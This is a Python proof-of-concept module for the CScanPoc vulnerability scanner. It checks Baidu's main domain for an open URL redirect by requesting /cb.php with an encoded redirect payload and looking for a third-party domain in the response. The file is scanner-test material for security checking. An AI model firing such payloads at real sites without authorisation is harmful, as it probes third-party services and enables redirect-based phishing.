# coding:utf-8
from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType

class Vuln(ABVuln):
    vuln_id = 'Baidu_0111' # 平台漏洞编号
    name = '百度主域存在url跳转' # 漏洞名称
    level = VulnLevel.LOW # 漏洞危害级别
    type = VulnType.OTHER # 漏洞类型
    disclosure_date = '2015-01-20'  # 漏洞公布时间
    desc = '''模版漏洞描述
    百度主域存在url跳转漏洞，攻击者可以通过url跳转将应用程序引导到不安全的第三方区域，从而导致的安全问题。
    ''' # 漏洞描述
    ref = 'Unknown' # 漏洞来源https://wooyun.shuimugan.com/bug/view?bug_no=92689
    cnvd_id = 'Unknown' # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'Baidu'  # 漏洞组件名称
    product_version = 'Unknown'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = 'b949fa02-e58c-4e77-8032-0abc3a43748f' # 平台 POC 编号
    author = 'hyhmnn'  # POC编写者
    create_date = '2018-06-20' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            payload = "/cb.php?c=IgF_pyfqnHRzrj6kn1R0IZ0qnfK9ujYkPjbsrj610Aw-5HDdnWbznHR0TAq15HbdnHcYn6K15H04uhRkPhRsmH03PjDvPvc0uZfqnHfznHmdnHmvrfKdThsqpZwYTjCEQLILIz4JpgNJpgNCIgI9pi4WUvYEP1nvP1b1Qh9YUys0ThfqnW60mhYqn0KsTWYs0ZNGujY1Pjnknj0k0AqGujY3njfsP6KWpyfqnHDzrjRL0AqLUWYLrjD4nfKWThnqn1nsPjD"
            url = self.target + payload
            response = requests.get(url)
            if response.status_code==200 and "jiujiuhuwai.com" in response.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target, name=self.vuln.name))
        except Exception, e:
            self.output.info('执行异常：{}'.format(e))

    def exploit(self):
        self.verify()

if __name__ == '__main__':
    Poc().run()
